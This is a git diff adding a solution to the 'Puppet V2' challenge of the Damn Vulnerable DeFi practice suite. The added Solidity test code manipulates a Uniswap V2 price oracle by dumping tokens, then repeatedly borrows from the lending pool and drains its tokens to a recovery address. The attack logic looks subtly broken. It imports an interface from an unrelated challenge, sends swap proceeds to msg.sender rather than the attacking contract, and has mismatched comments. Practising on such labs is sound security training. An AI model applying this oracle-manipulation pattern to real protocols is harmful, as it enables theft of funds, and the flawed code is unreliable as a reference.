@@ -9,6 +9,7 @@ import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUn
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
+import {IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
 
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -98,7 +99,62 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        // Step 1: Swap a large number of tokens for Ether to manipulate the price in Uniswap V2
+        token.approve(address(uniswapV2Router), 10000 ether); // Approve the router to spend tokens
+        address[] memory tokenToWethPath = new address[](2);  // Path for swapping Token → WETH
+        tokenToWethPath[0] = address(token);                  // Input token (DamnValuableToken)
+        tokenToWethPath[1] = address(weth);                   // Output token (WETH)
+    
+        uniswapV2Router.swapExactTokensForETH(
+            10000 ether,                // amountIn: Amount of tokens to swap
+            0,                          // amountOutMin: Accept any amount of Ether
+            tokenToWethPath,            // Path: Token → WETH
+            msg.sender,                 // to: Send Ether to the attacker
+            block.timestamp + 300       // deadline: 5 minutes from now
+        );
+    
+        // Step 2: Borrow tokens in a loop, manipulate the price in each iteration
+        for (uint256 i = 0; i < 20; i++) {
+            // Calculate the WETH required for the next borrowing transaction
+            uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(50_000 ether);
+    
+            // Convert the required amount of Ether to WETH
+            weth.deposit{value: wethRequired}();
+            weth.approve(address(lendingPool), wethRequired); // Approve the pool to spend WETH
+    
+            // Borrow tokens from the lending pool
+            lendingPool.borrow(50_000 ether);
+    
+            // Swap the borrowed tokens back to Ether to manipulate the price again
+            token.approve(address(uniswapV2Router), 50_000 ether);
+            uniswapV2Router.swapExactTokensForETH(
+                50_000 ether,             // amountIn: Amount of tokens to swap
+                0,                        // amountOutMin: Accept any amount of Ether
+                tokenToWethPath,          // Path: Token → WETH
+                msg.sender,               // to: Send Ether to the attacker
+                block.timestamp + 300     // deadline: 5 minutes from now
+            );
+        }
+    
+        // Step 3: Purchase the remaining tokens from the pool using WETH
+        address[] memory wethToTokenPath = new address[](2);   // Path for swapping WETH → Token
+        wethToTokenPath[0] = address(weth);                   // Input token (WETH)
+        wethToTokenPath[1] = address(token);                  // Output token (DamnValuableToken)
+    
+        // Calculate the amount of WETH required to buy all tokens in the pool
+        uint256[] memory wethAmountsIn = uniswapV2Router.getAmountsIn(POOL_INITIAL_TOKEN_BALANCE, wethToTokenPath);
+        uint256 wethNeeded = wethAmountsIn[0];
+    
+        // Swap Ether for all remaining tokens in the pool
+        uniswapV2Router.swapExactETHForTokens{value: wethNeeded}(
+            0,                          // amountOutMin: Accept any number of tokens
+            wethToTokenPath,            // Path: WETH → Token
+            player,                     // to: Send tokens to the attacker
+            block.timestamp             // deadline: 5 minutes from now
+        );
+    
+        // Step 4: Transfer all tokens to the recovery address
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE); // Transfer all borrowed tokens to the recovery address
     }
 
     /**
@@ -109,3 +165,7 @@ contract PuppetV2Challenge is Test {
         assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+
+
+
